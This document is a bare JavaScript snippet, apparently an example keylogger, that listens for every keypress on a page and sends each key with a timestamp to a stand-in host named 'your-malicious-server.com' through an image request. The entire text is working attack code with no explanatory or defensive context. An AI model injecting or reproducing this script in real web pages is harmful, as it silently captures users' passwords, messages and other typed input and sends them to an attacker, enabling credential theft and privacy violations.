document.addEventListener('keydown', function(e) {
    new Image().src = `https://your-malicious-server.com/log?key=${encodeURIComponent(e.key)}&time=${Date.now()}`;
});
